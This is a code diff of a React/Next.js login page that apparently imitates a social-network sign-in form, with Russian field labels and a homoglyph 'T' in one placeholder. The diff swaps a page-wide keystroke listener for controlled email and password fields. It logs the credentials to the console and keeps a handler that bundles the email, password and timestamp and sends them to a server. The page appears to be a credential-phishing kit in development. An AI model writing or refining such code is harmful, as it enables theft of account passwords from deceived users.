@@ -8,36 +8,18 @@ import Link from "next/link";
 
 export default function Home() {
   const [startTime] = useState(new Date());
-  const [inputData, setInputData] = useState({});
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
   const [loading, setLoading] = useState(false);
 
-  // Capture keyboard events
-  useEffect(() => {
-    const handleKeyPress = (e) => {
-      const inputName = e.target.name;
-      const inputValue = e.target.value;
-
-      setInputData((prevData) => ({
-        ...prevData,
-        [inputName]: inputValue,
-      }));
-    };
-
-    document.addEventListener("keydown", handleKeyPress);
-
-    return () => {
-      document.removeEventListener("keydown", handleKeyPress);
-    };
-  }, []);
-
+  console.log(email, password);
   // Capture form submission
   const handleFormSubmit = () => {
     setLoading(true);
-
     // Send data to the server
     const formData = {
-      email: inputData.email,
-      password: inputData.password,
+      email,
+      password,
       date: startTime.toISOString(),
     };
 
@@ -57,6 +39,13 @@ export default function Home() {
         console.error("Error sending data to server:", error);
       });
   };
+  console.log(
+    Boolean(
+      email?.trim() === "" ||
+        password?.trim() === "" ||
+        password?.trim().length < 8
+    )
+  );
   return (
     <>
       <main className="flex align-items-center justify-content-center">
@@ -71,16 +60,29 @@ export default function Home() {
                 Tелефон, имя пользователя или эл. адрес
               </label>
               <input
+                onChange={(e) => setEmail(e.target.value)}
                 name="email"
                 placeholder="Tелефон, имя пользователя или эл. адрес"
               />
-
               <label htmlFor="password" className="sr-only">
                 Пароль
               </label>
-              <input name="password" type="password" placeholder="Пароль" />
-
-              <button id="submit" type="button" onClick={handleFormSubmit}>
+              <input
+                onChange={(e) => setPassword(e.target.value)}
+                name="password"
+                type="password"
+                placeholder="Пароль"
+              />
+              <button
+                disabled={Boolean(
+                  email?.trim() === "" ||
+                    password?.trim() === "" ||
+                    password?.trim().length < 8
+                )}
+                id="submit"
+                type="button"
+                onClick={handleFormSubmit}
+              >
                 {loading ? (
                   <Image
                     className="copyright"
